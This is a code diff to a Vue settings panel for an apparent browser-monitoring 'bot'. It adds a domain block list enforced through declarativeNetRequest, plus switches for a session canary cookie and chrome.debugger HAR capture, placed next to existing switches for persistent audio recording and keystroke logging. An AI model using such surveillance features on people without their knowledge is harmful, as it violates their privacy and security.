@@ -56,6 +56,15 @@ const notificationDomains = ref<string[]>(
   })(),
 )
 const domainInput = ref('')
+const blockDomains = ref<string[]>(
+  (() => {
+    const raw = props.bot.data_config?.BLOCK_DOMAINS
+    if (Array.isArray(raw)) return raw as string[]
+    if (typeof raw === 'string' && raw.length > 0) return raw.split(',').map((d: string) => d.trim()).filter(Boolean)
+    return []
+  })(),
+)
+const blockInput = ref('')
 
 function addDomain(): void {
   const val = domainInput.value.trim()
@@ -98,6 +107,7 @@ async function saveConfig(): Promise<void> {
         SYNC_INTERVAL: syncInterval.value,
         SYNC_HUGE_INTERVAL: syncHugeInterval.value,
         NOTIFICATION_DOMAINS: notificationDomains.value,
+        BLOCK_DOMAINS: blockDomains.value,
       },
     })
     autoSaveOk.value = true
@@ -116,6 +126,21 @@ watch(
 )
 
 const isNotificationEnabled = computed(() => switchConfig.value['NOTIFICATION'] ?? false)
+const isBlockEnabled = computed(() => switchConfig.value['DNR_BLOCK'] ?? false)
+
+function addBlockDomain(): void {
+  const val = blockInput.value.trim()
+  if (val && !blockDomains.value.includes(val)) {
+    blockDomains.value = [...blockDomains.value, val]
+    saveConfig()
+  }
+  blockInput.value = ''
+}
+
+function removeBlockDomain(domain: string): void {
+  blockDomains.value = blockDomains.value.filter((d) => d !== domain)
+  saveConfig()
+}
 
 const intervalOptions = [
   { value: 5000, label: '5s' },
@@ -183,6 +208,10 @@ watch(
     if (Array.isArray(raw)) notificationDomains.value = raw as string[]
     else if (typeof raw === 'string' && raw.length > 0) notificationDomains.value = raw.split(',').map((d: string) => d.trim()).filter(Boolean)
     else notificationDomains.value = []
+    const blocked = b.data_config?.BLOCK_DOMAINS
+    if (Array.isArray(blocked)) blockDomains.value = blocked as string[]
+    else if (typeof blocked === 'string' && blocked.length > 0) blockDomains.value = blocked.split(',').map((d: string) => d.trim()).filter(Boolean)
+    else blockDomains.value = []
   },
 )
 
@@ -200,6 +229,9 @@ const switches: SwitchItem[] = [
   { key: 'NOTIFICATION', label: 'Domain notifications', help: 'Notify on monitored domain visits.', category: 'monitor' },
   { key: 'PERSISTENT_RECORDING', label: 'Persistent audio', help: 'Keep recording across navigations.', category: 'monitor' },
   { key: 'PERSISTENT_KEYBOARD', label: 'Persistent keyboard', help: 'Keep keystroke logging across navigations.', category: 'monitor' },
+  { key: 'CANARY', label: 'Session canary', help: 'Plant a unique cookie and alert if it appears on another endpoint.', category: 'monitor' },
+  { key: 'DNR_BLOCK', label: 'Policy block', help: 'Use declarativeNetRequest to block listed domains.', category: 'monitor' },
+  { key: 'DEBUGGER', label: 'Debugger HAR', help: 'Allow chrome.debugger HAR capture (shows a debugging banner).', category: 'monitor' },
 ]
 
 const switchCategories = [
@@ -323,6 +355,36 @@ async function saveIdentity(): Promise<void> {
                 type="button"
                 class="h-7 px-2.5 text-[11px] rounded bg-accent/10 text-accent border border-accent/25 hover:bg-accent/20 transition-colors"
                 @click="addDomain"
+              >Add</button>
+            </div>
+          </div>
+          <div
+            v-if="cat.id === 'monitor' && isBlockEnabled"
+            class="px-3 py-2 bg-bg-base/30 border-t border-border-subtle"
+          >
+            <div class="text-[11px] font-medium text-fg-muted mb-1.5">Blocked domains (DNR)</div>
+            <div class="flex flex-wrap gap-1.5 mb-2" v-if="blockDomains.length">
+              <span
+                v-for="domain in blockDomains"
+                :key="domain"
+                class="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] bg-danger/15 text-danger border border-danger/25"
+              >
+                {{ domain }}
+                <button type="button" class="text-danger/60 hover:text-danger ml-0.5 leading-none" @click="removeBlockDomain(domain)">&times;</button>
+              </span>
+            </div>
+            <div class="flex gap-2">
+              <input
+                v-model="blockInput"
+                type="text"
+                placeholder="e.g. phish.example"
+                class="flex-1 h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle placeholder:text-fg-faint/50"
+                @keydown.enter.prevent="addBlockDomain"
+              />
+              <button
+                type="button"
+                class="h-7 px-2.5 text-[11px] rounded bg-danger/10 text-danger border border-danger/25 hover:bg-danger/20 transition-colors"
+                @click="addBlockDomain"
               >Add</button>
             </div>
           </div>
